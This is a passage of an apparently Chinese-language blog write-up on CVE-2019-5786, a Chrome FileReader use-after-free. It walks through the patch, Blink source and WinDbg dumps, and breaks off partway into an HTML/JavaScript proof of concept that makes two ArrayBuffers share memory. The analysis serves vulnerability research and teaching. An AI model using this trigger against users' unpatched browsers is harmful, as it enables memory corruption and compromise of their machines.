<p>由测试结果可知，不管解码成功与否，ArrayBuffer 都会被转移：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before decodeAudioData, ab.byteLength is 4096</span><br><span class="line">After decodeAudioData, ab.byteLength is 0</span><br><span class="line">decode failed: EncodingError: Unable to decode audio data</span><br></pre></td></tr></table></figure>

<h3 id="3、补丁比较"><a href="#3、补丁比较" class="headerlink" title="3、补丁比较"></a>3、补丁比较</h3><p>观察补丁代码，可以发现在if (!finished_loading_)的逻辑上做了修改</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210514163855121.png" alt="image-20210514163855121"></p>
<p>补丁前处理逻辑：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br></pre></td></tr></table></figure>

<p>补丁后处理逻辑</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> DOMArrayBuffer::Create(<span class="built_in">ArrayBuffer</span>::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));</span><br></pre></td></tr></table></figure>

<p>可以看出一个使用了raw_data_-&gt;ToArrayBuffer()作为参数，另一个使用了ArrayBuffer::Create()的返回值作为参数。</p>
<p>而commit的信息也提示了我们修复后的代码可能新开辟了一块内存</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Merge M72: FileReader: Make a copy of the ArrayBuffer when returning partial results.</span><br><span class="line"></span><br><span class="line">This is to avoid accidentally ending up with multiple references to the</span><br><span class="line">same underlying ArrayBuffer.</span><br></pre></td></tr></table></figure>
</blockquote>
<p>猜测补丁后的Create将原有buffer内容复制到了一个新的buffer上，目的是为了避免多个指针指向同一块内存引发误操作。</p>
<h3 id="4、漏洞分析"><a href="#4、漏洞分析" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><h4 id="（1）静态分析"><a href="#（1）静态分析" class="headerlink" title="（1）静态分析"></a>（1）静态分析</h4><p>通过代码分析下函数功能。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DOMArrayBuffer* <span class="title">FileReaderLoader::ArrayBufferResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  DOMArrayBuffer* result = DOMArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">ToArrayBuffer</span>());</span><br><span class="line">  <span class="keyword">if</span> (finished_loading_) &#123;</span><br><span class="line">    array_buffer_result_ = result;</span><br><span class="line">    <span class="built_in">AdjustReportedMemoryUsageToV8</span>(</span><br><span class="line">        <span class="number">-1</span> * <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(raw_data_-&gt;<span class="built_in">ByteLength</span>()));</span><br><span class="line">    raw_data_.<span class="built_in">reset</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>FileReaderLoader::ArrayBufferResult函数首先判断文件是否已经全部读取完成，如果已全部读取完成，则返回该缓冲区，如果尚未加载或产生错误，则返回空，如果数据正在被加载，则返回DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer())的返回值。</p>
<p>修复后的代码如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DOMArrayBuffer* <span class="title">FileReaderLoader::ArrayBufferResult</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (!finished_loading_) &#123;</span><br><span class="line">    <span class="keyword">return</span> DOMArrayBuffer::<span class="built_in">Create</span>(</span><br><span class="line">        ArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">Data</span>(), raw_data_-&gt;<span class="built_in">ByteLength</span>()));</span><br><span class="line">  &#125;</span><br><span class="line">  array_buffer_result_ = DOMArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">ToArrayBuffer</span>());</span><br><span class="line">  <span class="built_in">AdjustReportedMemoryUsageToV8</span>(<span class="number">-1</span> *</span><br><span class="line">                                <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(raw_data_-&gt;<span class="built_in">ByteLength</span>()));</span><br><span class="line">  raw_data_.<span class="built_in">reset</span>();</span><br><span class="line">  <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修复后的逻辑仅仅在数据正在被加载时的处理不同，它使用了DOMArrayBuffer::Create(ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()))的返回值。</p>
<p>所以首先查看ToArrayBuffer()函数，首先判断已加载的部分是否等于buffer的长度，如果不满足条件，则调用Slice函数对buffer_进行切割。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.cc</span></span><br><span class="line"><span class="function">scoped_refptr&lt;ArrayBuffer&gt; <span class="title">ArrayBufferBuilder::ToArrayBuffer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Fully used. Return m_buffer as-is.</span></span><br><span class="line">  <span class="keyword">if</span> (buffer_-&gt;<span class="built_in">ByteLength</span>() == bytes_used_)</span><br><span class="line">    <span class="keyword">return</span> buffer_;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> buffer_-&gt;<span class="built_in">Slice</span>(<span class="number">0</span>, bytes_used_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续查看Slice函数，简单的调用了SliceImpl函数对buffer_进行处理。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">scoped_refptr&lt;ArrayBuffer&gt; <span class="title">ArrayBuffer::Slice</span><span class="params">(<span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">SliceImpl</span>(<span class="built_in">ClampIndex</span>(begin), <span class="built_in">ClampIndex</span>(end));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的ClampIndex函数作用为对参数值进行处理，首先将小于0的参数转换成从后面计算的偏移，之后再将参数限定在0和ByteLength()之间。其目的就是对参数进行处理</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">ArrayBuffer::ClampIndex</span><span class="params">(<span class="keyword">int</span> index)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> current_length = <span class="built_in">ByteLength</span>();</span><br><span class="line">  <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">    index = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(current_length + index);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ClampValue</span>(index, <span class="number">0</span>, current_length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">ArrayBuffer::ClampValue</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">unsigned</span> left, <span class="keyword">unsigned</span> right)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_LE</span>(left, right);</span><br><span class="line">  <span class="keyword">unsigned</span> result;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">0</span>)</span><br><span class="line">    result = left;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span>&gt;(x);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result &lt; left)</span><br><span class="line">    result = left;</span><br><span class="line">  <span class="keyword">if</span> (right &lt; result)</span><br><span class="line">    result = right;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进SliceImpl函数，该函数调用了ArrayBuffer::Create函数，以static_cast&lt;const char*&gt;(Data()) + begin与长度作为参数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">scoped_refptr&lt;ArrayBuffer&gt; <span class="title">ArrayBuffer::SliceImpl</span><span class="params">(<span class="keyword">unsigned</span> begin, <span class="keyword">unsigned</span> end)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size = <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(begin &lt;= end ? end - begin : <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> ArrayBuffer::<span class="built_in">Create</span>(<span class="keyword">static_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(<span class="built_in">Data</span>()) + begin, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看下Data()的定义，发现是将buffer的数据返回，</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">ArrayBuffer::Data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> contents_.<span class="built_in">Data</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再看下ArrayBuffer::Create函数，该函数的作用就是创建一个buffer，并将之前的数据拷贝进去。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">scoped_refptr&lt;ArrayBuffer&gt; <span class="title">ArrayBuffer::Create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* source, <span class="keyword">size_t</span> byte_length)</span> </span>&#123;</span><br><span class="line">  <span class="function">ArrayBufferContents <span class="title">contents</span><span class="params">(byte_length, <span class="number">1</span>, ArrayBufferContents::kNotShared, ArrayBufferContents::kDontInitialize)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">UNLIKELY</span>(!contents.<span class="built_in">Data</span>()))</span><br><span class="line">    <span class="built_in">OOM_CRASH</span>();</span><br><span class="line">  scoped_refptr&lt;ArrayBuffer&gt; buffer = base::<span class="built_in">AdoptRef</span>(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(contents));</span><br><span class="line">  <span class="built_in">memcpy</span>(buffer-&gt;<span class="built_in">Data</span>(), source, byte_length);</span><br><span class="line">  <span class="keyword">return</span> buffer;					<span class="comment">//调试时发现，在32位程序中，buffer-&gt;Data()的地址每回都在变化，有时候可能会重用，而source的地址是固定的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时我们从该函数抽出，返回到最开始代码位置，查看DOMArrayBuffer* Create函数逻辑</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#third_party/blink/renderer/core/fileapi/file_reader_loader.cc</span><br><span class="line">DOMArrayBuffer* result = DOMArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">ToArrayBuffer</span>());</span><br><span class="line"></span><br><span class="line">#third_party/blink/renderer/core/typed_arrays/dom_array_buffer.<span class="function">h</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> DOMArrayBuffer* <span class="title">Create</span><span class="params">(scoped_refptr&lt;WTF::ArrayBuffer&gt; buffer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> MakeGarbageCollected&lt;DOMArrayBuffer&gt;(std::<span class="built_in">move</span>(buffer));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出通过std::move操作了buffer缓冲区，关于std::move在背景知识的第5部分已经进行了描述，这里的作用是将该缓冲区的所有权从主线程转移到了worker线程。</p>
<h4 id="（2）动态调试"><a href="#（2）动态调试" class="headerlink" title="（2）动态调试"></a>（2）动态调试</h4><h5 id="（1）触发相关函数"><a href="#（1）触发相关函数" class="headerlink" title="（1）触发相关函数"></a>（1）触发相关函数</h5><p>首先编写代码触发函数调用，通过动态调试查看我们关心的数据结构并理清程序的执行流</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> string_size = <span class="number">128</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> contents = <span class="built_in">String</span>.prototype.repeat.call(<span class="string">&#x27;Z&#x27;</span>, string_size);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> blob = <span class="keyword">new</span> Blob([contents]);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> reader = <span class="keyword">new</span> FileReader();	</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">reader.onprogress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">console</span>.log(<span class="string">`[onprogress] read length = 0x<span class="subst">$&#123;evt.target.result.byteLength.toString(<span class="number">0x10</span>)&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">reader.onloadend = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">console</span>.log(<span class="string">`[onloadend] read length = 0x<span class="subst">$&#123;evt.target.result.byteLength.toString(<span class="number">0x10</span>)&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">reader.readAsArrayBuffer(blob);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>执行结果如下，可以看出onprogress和onloadend都会处理长度为0x8000000的情况</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210526175135865.png" alt="image-20210526175135865"></p>
<p>动态调试分析下源代码中下面的这段逻辑代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* result = DOMArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">ToArrayBuffer</span>());</span><br></pre></td></tr></table></figure>

<p>查看ArrayBuffer::Create()函数的返回值。返回的是一个buffer结构体简介指针，可以通过这个指针获取到ByteLength()和Data()。</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210526152211843.png" alt="image-20210526152211843"></p>
<p>而这个返回值我们关心的内存地址可以通过下面的表达式获取，其中偏移0x4的位置为data数据存放位置，偏移0x8的位置为返回的buffer的大小</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd eax L4</span><br><span class="line">009cedb8  49c04f20 009cedbc d1bd2bff 3b0937a0</span><br><span class="line">0:000&gt; dd poi(poi(eax)+4) L4</span><br><span class="line">49c68220  00000001 1c204000 07300000 10e9de4c</span><br></pre></td></tr></table></figure>

<p>再经由上层的DOMArrayBuffer::Create()函数处理之后，返回值为0x58954e00。同样可以通过这个指针获取到ByteLength()和Data()。</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210526155314949.png" alt="image-20210526155314949"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd eax L4</span><br><span class="line">58954e00  1331e300 00000000 49c04f20 00000000</span><br><span class="line">0:000&gt; dd poi(poi(eax+0x8)+0x4) L4</span><br><span class="line">49c68220  00000001 1c204000 07300000 10e9de4c</span><br></pre></td></tr></table></figure>

<p>ToArrayBuffer()函数调用了ArrayBuffer::Create()函数来分配buffer，而ArrayBuffer::Create()的返回值实际上也正是ToArrayBuffer()的返回值。是上面的0x009cedb8，将该返回值作为DOMArrayBuffer::Create()函数的参数，该函数同样得到了一个返回值0x58954e00。</p>
<h5 id="（2）简单梳理"><a href="#（2）简单梳理" class="headerlink" title="（2）简单梳理"></a>（2）简单梳理</h5><p>简单梳理下代码静态分析以及刚刚动态调试得到的结果。还是拿之前的FileReaderLoader::ArrayBufferResult()代码进行描述：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* FileReaderLoader::<span class="function"><span class="title">ArrayBufferResult</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  DCHECK_EQ(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> nullptr;</span><br><span class="line">  DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br><span class="line">  <span class="keyword">if</span> (finished_loading_) &#123;</span><br><span class="line">    array_buffer_result_ = result;</span><br><span class="line">    AdjustReportedMemoryUsageToV8(</span><br><span class="line">        -<span class="number">1</span> * static_cast&lt;int64_t&gt;(raw_data_-&gt;ByteLength()));</span><br><span class="line">    raw_data_.reset();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于先执行了DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());再对 finished_loading_进行判断以对array_buffer_result_进行赋值，之后在代码的最上面对 array_buffer_result_ 进行判断，所以就存在这样一个问题：文件加载完成后，ToArrayBuffer逻辑中对buffer_-&gt;ByteLength与bytes_used_是否相等的判断才会成功，从而从而直接返回缓冲区的指针，否则返回指向该缓冲区副本的指针。我们聚焦下直接返回缓冲区的指针的情况，此时返回的指针result可以间接指向buffer的缓冲区，之后finished_loading_加载完成，执行了语句 <strong>array_buffer_result_ = result;</strong> 这样我们下次进入该函数时，通过了第三行代码的判断，直接放回间接指向buffer缓冲区的指针，此时原来的result指针也可以操作buffer缓冲区，由于两个指针可以同时操作一块地址空间，这就造成了UAF。</p>
<p>下面是调试记录</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210526190651045.png" alt="image-20210526190651045"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#下面的四个内存分布对应了上面的四次事件触发</span><br><span class="line">0:000&gt; dd eax</span><br><span class="line">58957318  1331e300 00000000 49c04680 00000000</span><br><span class="line">0:000&gt; dd eax</span><br><span class="line">58957328  1331e300 00000000 49c04820 00000000</span><br><span class="line">0:000&gt; dd eax</span><br><span class="line">58957338  1331e300 00000000 49c04820 00000000</span><br><span class="line">0:000&gt; dd esi</span><br><span class="line">58957338  1331e300 09551ff8 49c04820 00000000</span><br><span class="line"></span><br><span class="line">0:000&gt; dd 49c04680</span><br><span class="line">49c04680  00000001 49c6a560 00000000 00000000</span><br><span class="line">0:000&gt; dd 49c04820</span><br><span class="line">49c04820  00000002 49c6a4c0 00000000 00000000</span><br><span class="line">0:000&gt; dd 49c04820</span><br><span class="line">49c04820  00000003 49c6a4c0 00000000 00000000</span><br><span class="line">0:000&gt; dd 49c04820</span><br><span class="line">49c04820  00000002 49c6a4c0 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:000&gt; dd 49c6a560</span><br><span class="line">49c6a560  00000001 a0204000 07ff0000 10e9de4c			#第一次为bytes_used_还小于buffer_-&gt;ByteLength时，此时偏移0x8位置为临时buffer</span><br><span class="line">0:000&gt; dd 49c6a4c0</span><br><span class="line">49c6a4c0  00000001 80004000 08000000 10e9de4c			#后面三次为bytes_used_等于buffer_-&gt;ByteLength时，此时偏移0x8位置为真实要操作的buffer</span><br><span class="line">0:000&gt; dd 49c6a4c0</span><br><span class="line">49c6a4c0  00000001 80004000 08000000 10e9de4c</span><br><span class="line">0:000&gt; dd 49c6a4c0</span><br><span class="line">49c6a4c0  00000001 80004000 08000000 10e9de4c</span><br><span class="line"></span><br><span class="line">#此时可见58957328与58957338两个指针都可以操作49c04820这块空间，进而控制buffer，如果释放掉其中一个而使用另外一个，则会造成UAF。</span><br><span class="line">0:000&gt; dd 58957328</span><br><span class="line">58957328  1331e300 095520d8 49c04820 00a80010</span><br><span class="line">58957338  1331e300 09551ff8 49c04820 00000000</span><br></pre></td></tr></table></figure>

<p>对上面的内存现场进行分析</p>
<blockquote>
<p>1、第一次尚未读取完成，返回的指针指向临时buffer中。大小0x07ff0000。</p>
<p>2、第二次读取完成，但是此时finished_loading_还未置为1，返回真实buffer。大小0x08000000。</p>
<p>3、第三次读取完成，此时finished_loading_已经置为1，并对array_buffer_result_进行了赋值。返回真实buffer。大小0x08000000。与2的指针值不相同。</p>
<p>2、第四次读取完成，触发onloadend，返回真实buffer。大小0x08000000，与3的指针值相同。</p>
</blockquote>
<p>简单来说就是由于逻辑错误使两个指针可以操作同一块内存，而且可以发现最后两个onprogress指针地址就是不相同的，而onloadend与最后一个onprogress的指针是相同的。所以poc或者exp的构造方式就有两种情况：</p>
<blockquote>
<p>1、找到最后两个相同大小的onprogress指针进行操作。（下面exp的方式）</p>
<p>2、找到倒数第二个onprogress指针与onloadend指针进行操作，当然也需要这两个指针指向的长度相同。（下面poc的方式）</p>
</blockquote>
<h4 id="（3）POC分析"><a href="#（3）POC分析" class="headerlink" title="（3）POC分析"></a>（3）POC分析</h4><p>代码如下，这里的代码参考[14]</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- poc.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ab1, ab2;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> byteLength = <span class="number">100</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onProgress</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (ab1.byteLength != byteLength) &#123;</span></span><br><span class="line"><span class="javascript">        ab1 = event.target.result;			<span class="comment">//event.target.result：事件的元素</span></span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onLoadEnd</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    ab2 = event.target.result;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (ab1 != ab2 &amp;&amp; ab1.byteLength == ab2.byteLength) &#123;			<span class="comment">//这里判断下ab1和ab2的指针是否相同，但是我在调试中发现event.target.result返回的是type，不是很能理解</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> flag = <span class="number">0x61616161</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">new</span> <span class="built_in">DataView</span>(ab1).setUint32(<span class="number">0</span>, flag, <span class="literal">true</span>);					<span class="comment">//这里将前四个字节改成0x61616161</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">DataView</span>(ab2).getUint32(<span class="number">0</span>, <span class="literal">true</span>) == flag) &#123;			<span class="comment">//这里验证下ab1和ab2是否可以操作同一块空间</span></span></span><br><span class="line"><span class="javascript">            <span 